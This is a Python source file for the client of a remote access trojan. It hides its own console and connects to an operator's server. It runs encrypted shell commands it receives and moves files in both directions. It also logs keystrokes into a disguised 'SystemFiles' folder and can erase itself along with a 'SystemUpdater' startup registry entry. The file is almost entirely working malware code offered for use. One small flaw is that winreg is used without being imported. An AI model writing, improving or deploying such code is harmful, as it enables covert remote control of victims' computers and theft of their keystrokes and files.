import socket
import os
import base64
import subprocess
import threading
import shutil
import sys
import hashlib
from cryptography.fernet import Fernet
from pynput import keyboard
import ctypes

# Constants for connection
SERVER_HOST = "127.0.0.1"  # Change to your server's IP
SERVER_PORT = 5000  # Change to your server's listening port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# Encryption key should match the server key
key = b'_CiQOJse0uWP9nIP0cC0KiCJI9TMaJGwmCHfukyUG6c='
cipher = Fernet(key)

# Variable to control the keylogger thread
keylogger_running = False

# Determine log directory based on the operating system
if os.name == "nt":  # Windows
    LOG_DIR = os.path.join(os.getenv("APPDATA"), "SystemFiles")
else:  # Linux/MacOS
    LOG_DIR = os.path.expanduser("~/.SystemFiles")

# Ensure the directory exists
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

keylog_file = os.path.join(LOG_DIR, "keylog.txt")


def hide_console():
    # Hides the console/terminal on Windows, Linux, and macOS"""
    if os.name == "nt":
        # Hide the console on Windows
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    else:
        # Hide the terminal on Linux/macOS by redirecting output to /dev/null
        if sys.stdout.isatty():
            sys.stdout = open(os.devnull, 'w')
            sys.stderr = open(os.devnull, 'w')


def connect_to_server():
    client_socket = socket.socket()
    client_socket.connect((SERVER_HOST, SERVER_PORT))

    cwd = os.getcwd()
    client_socket.send(cwd.encode())

    while True:
        try:
            # Receive and decrypt the encrypted command
            encrypted_command = client_socket.recv(BUFFER_SIZE)
            command = cipher.decrypt(encrypted_command).decode()

            if command.lower() == "exit":
                send_keylog_file(client_socket)
                break
            elif command.lower() == "self-destruct":
                self_destruct(client_socket)
                break
            elif command.lower().startswith("download"):
                filename = command.split()[1]
                send_file(client_socket, filename)
            elif command.lower().startswith("upload"):
                filename = command.split()[1]
                receive_file(client_socket, filename)
            elif command.lower() == "keylog":
                if not keylogger_running:
                    threading.Thread(target=start_keylogger).start()
                client_socket.send(cipher.encrypt(b"Keylogger started."))
            else:
                output = subprocess.getoutput(command)
                message = f"{output}{SEPARATOR}{os.getcwd()}"
                encrypted_message = cipher.encrypt(message.encode())
                client_socket.send(encrypted_message)
        except Exception as e:
            client_socket.send(cipher.encrypt(f"Error: {str(e)}".encode()))

    client_socket.close()


def send_file(client_socket, filename):
    if os.path.exists(filename):
        with open(filename, "rb") as f:
            file_hash = hashlib.md5()  # Using MD5 for file integrity check
            while chunk := f.read(BUFFER_SIZE):
                client_socket.send(chunk)
                file_hash.update(chunk)
        client_socket.send(b"<END>")
    else:
        client_socket.send(cipher.encrypt(b"File not found."))


def receive_file(client_socket, filename):
    with open(filename, "wb") as f:
        while True:
            data = client_socket.recv(BUFFER_SIZE)
            if data == b"<END>":
                break
            f.write(data)


def send_keylog_file(client_socket):
    if os.path.exists(keylog_file):
        send_file(client_socket, keylog_file)
    else:
        client_socket.send(cipher.encrypt(b"No keylog file to send."))


def start_keylogger():
    global keylogger_running
    keylogger_running = True

    buffer = []

    def on_press(key):
        buffer.append(f"{key}\n")

        if len(buffer) >= 100:
            with open(keylog_file, "a") as log_file:
                log_file.write("".join(buffer))
            buffer.clear()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    if buffer:
        with open(keylog_file, "a") as log_file:
            log_file.write("".join(buffer))

    keylogger_running = False


def self_destruct(client_socket):
    try:
        if os.name == "nt":
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(reg_key, "SystemUpdater")
            winreg.CloseKey(reg_key)

        os.remove(__file__)
        client_socket.send(cipher.encrypt(b"Self-destruct successful. Goodbye!"))
    except Exception as e:
        client_socket.send(cipher.encrypt(f"Error during self-destruct: {str(e)}".encode()))


if __name__ == "__main__":
    hide_console()
    connect_to_server()
